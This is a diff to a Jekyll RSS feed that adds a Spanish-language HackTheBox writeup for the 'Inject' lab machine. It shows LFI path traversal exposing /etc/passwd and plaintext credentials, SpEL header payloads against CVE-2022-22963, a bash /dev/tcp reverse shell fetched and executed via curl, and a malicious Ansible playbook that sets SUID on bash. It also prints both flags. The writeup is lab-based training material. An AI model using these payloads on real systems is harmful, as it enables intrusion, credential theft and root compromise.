@@ -5,9 +5,468 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 18 Jul 2023 03:53:21 +0000</pubDate>
-    <lastBuildDate>Tue, 18 Jul 2023 03:53:21 +0000</lastBuildDate>
+    <pubDate>Wed, 19 Jul 2023 20:40:37 +0000</pubDate>
+    <lastBuildDate>Wed, 19 Jul 2023 20:40:37 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Inject - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Inject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un &lt;code&gt;LFI&lt;/code&gt; y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de &lt;code&gt;spring framework&lt;/code&gt; que nos otorgara &lt;code&gt;RCE&lt;/code&gt; y finalmente para elevar nuestros privilegios abusaremos de una &lt;code&gt;cron job&lt;/code&gt; para crearnos un archivo malicioso &lt;code&gt;ansible playbook&lt;/code&gt;, manipulando los permisos de la &lt;code&gt;bash&lt;/code&gt; y asi convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Inject
+❯ ls
+
+ Inject
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.204
+PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
+64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms
+
+--- 10.10.11.204 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
+Initiating SYN Stealth Scan at 18:09
+Scanning 10.10.11.204 [65535 ports]
+Discovered open port 8080/tcp on 10.10.11.204
+Discovered open port 22/tcp on 10.10.11.204
+Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.204
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-07-19 18:09:29 GMT for 16s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
+           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
+Nmap scan report for 10.10.11.204
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
+|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
+|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 8.2p1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8080&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;nagios-nsca Nagios NSCA&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.204:8080
+http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que existe una sección de login y registro pero que esta actualmente en construcción.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En la pagina principal tambien podemos ver una sección de &lt;code&gt;upload&lt;/code&gt;, la cual nos redirige a una ruta de subida de archivos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a tratar de subir un archivo simple con extensión &lt;code&gt;txt&lt;/code&gt; y vamos a interceptar la petición con &lt;code&gt;burpsuite&lt;/code&gt; para realizar pruebas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Interceptamos la petición y la mandamos al &lt;code&gt;Repeater&lt;/code&gt;, y vemos como respuesta que solo podemos subir imagenes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=..&quot;
+java
+resources
+uploads
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora podemos listar los usuarios de el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd&quot; | grep &quot;sh$&quot;
+root:x:0:0:root:/root:/bin/bash
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo &lt;code&gt;settings.xml&lt;/code&gt; en el directorio del usuario &lt;code&gt;frank&lt;/code&gt;. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario &lt;code&gt;phill&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2&quot;
+settings.xml
+❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml&quot; -o settings.xml
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat settings.xml
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
+  &amp;lt;servers&amp;gt;
+    &amp;lt;server&amp;gt;
+      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
+      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
+      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
+      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
+      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
+      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
+      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
+    &amp;lt;/server&amp;gt;
+  &amp;lt;/servers&amp;gt;
+&amp;lt;/settings&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si tratamos de contectarnos por el servicio &lt;code&gt;ssh&lt;/code&gt;, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo &lt;code&gt;pom.xml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../&quot;
+.classpath
+.DS_Store
+.idea
+.project
+.settings
+HELP.md
+mvnw
+mvnw.cmd
+pom.xml
+src
+target
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si vemos el contenido vemos que esta relacionado a &lt;code&gt;spring framework&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat pom.xml
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+	xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
+	&amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
+	&amp;lt;parent&amp;gt;
+		&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
+		&amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
+		&amp;lt;version&amp;gt;2.6.5&amp;lt;/version&amp;gt;
+		&amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si buscamos un poco encontramos un exploit que nos otorga &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si abrimos el explit, observamos que este se aprovecha de una ruta &lt;code&gt;functionRouter&lt;/code&gt; y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio &lt;code&gt;curl&lt;/code&gt;. Nos mandamos una traza a nuestra maquina host.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 1 10.10.16.2&quot;)' -d '.'
+{&quot;timestamp&quot;:&quot;2023-07-19T18:56:07.739+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y recibimos la petición.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+18:56:22.791783 IP 10.10.11.204 &amp;gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
+18:56:22.791819 IP 10.10.16.2 &amp;gt; 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para ganar acceso vamos a crearnos un archivo en bash de nombre &lt;code&gt;index.html&lt;/code&gt; que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat index.html
+#!/bin/bash
+
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Realizamos la petición.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl 10.10.16.2 -o /tmp/reverse&quot;)' -d '.'
+{&quot;timestamp&quot;:&quot;2023-07-19T18:58:54.291+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recibimos la petición en nuestro servicio.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.204 - - [19/Jul/2023 18:59:09] &quot;GET / HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora solo debemos ejecutarlo y ponermos en escucha con &lt;code&gt;ntcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse&quot;)' -d '.'
+{&quot;timestamp&quot;:&quot;2023-07-19T19:05:11.598+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}#                        
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos acceso como el usuario &lt;code&gt;frank&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.204.
+Ncat: Connection from 10.10.11.204:60530.
+bash: cannot set terminal process group (827): Inappropriate ioctl for device
+bash: no job control in this shell
+frank@inject:/$ whoami
+whoami
+frank
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como siempre hacemos el tratamiento para obtener una full &lt;code&gt;tty&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+frank@inject:/$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+frank@inject:/$ export TERM=xterm
+frank@inject:/$ export SHELL=bash
+frank@inject:/$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ find / -name user.txt 2&amp;gt;/dev/null
+/home/phil/user.txt
+^C
+frank@inject:/$ cat /home/phil/user.txt
+cat: /home/phil/user.txt: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recordemos que antes obtuvimos unas credenciales del usuario &lt;code&gt;phil&lt;/code&gt;, asi que vamos a tratar de usar esa contraseña y migrar al usuario &lt;code&gt;phil&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ su phil
+Password: 
+phil@inject:/$ whoami
+phil
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/$ cd /home/phil/
+phil@inject:~$ cat user.txt 
+7b309ae956b0821aef61ef39aa5d4f7e
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ya que somos el usuario &lt;code&gt;phil&lt;/code&gt;, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a &lt;code&gt;staff&lt;/code&gt;. Seguidamente listamos los recuros a los que tenemos acceso.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:~$ id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+phil@inject:~$ find / -group staff 2&amp;gt;/dev/null
+/opt/automation/tasks
+/root
+/var/local
+/usr/local/lib/python3.8
+/usr/local/lib/python3.8/dist-packages
+/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
+/usr/local/lib/python3.8/dist-packages/__pycache__
+/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
+/usr/local/share/fonts
+/usr/local/share/fonts/.uuid
+phil@inject:~$ /opt/automation/tasks
+bash: /opt/automation/tasks: Is a directory
+phil@inject:~$ ls -l /opt/automation/tasks
+total 4
+-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Observamos un &lt;code&gt;playbook.yml&lt;/code&gt;, si investigamos un poco encotramos que esta relacionado a ansible.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ cat procmon.sh
+#!/bin/bash
+
+old_process=$(ps -eo user, command)
+
+while true; do
+	new_process=$(ps -eo user, command)
+	diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|kworker|command&quot;
+	old_process=$new_process
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el script y obervamos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un borrado de todo lo que se encuentra en el directorio &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ ./procmon.sh 
+&amp;lt; root     /usr/sbin/CRON -f
+&amp;lt; root     /bin/sh -c sleep 10 &amp;amp;&amp;amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+&amp;lt; root     sleep 10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que podemos hacer es crearnos un archivo similar a &lt;code&gt;playbook_1.yml&lt;/code&gt; para insertar un comando y al ejecutar la tarea el usuario &lt;code&gt;root&lt;/code&gt;, podemos tratar de cambiar los permisos de la &lt;code&gt;bash&lt;/code&gt; otorgandole &lt;code&gt;suid&lt;/code&gt; y asi poder convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para ello primero debemos crearnos un archivo &lt;code&gt;reverse.yml&lt;/code&gt; malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ cat reverse.yml 
+- hosts: localhost
+  tasks:
+  - name: suid to bash
+    ansible.builtin.shell: chmod u+s /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la &lt;code&gt;bash&lt;/code&gt; ahora cuenta con el privilegio &lt;code&gt;suid&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que nos queda ahora es convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt 
+26521e5fb779f8e62fa4d068175a3b5a
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Inject</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Inject</guid>
+        
+        <category>Web Enumeation</category>
+        
+        <category>Local File Inclusion</category>
+        
+        <category>Information Leaked</category>
+        
+        <category>Spring CLoud Explotation</category>
+        
+        <category>Abusing Cron Job</category>
+        
+        <category>Malicius Ansible Playbook</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Node - htb writeup</title>
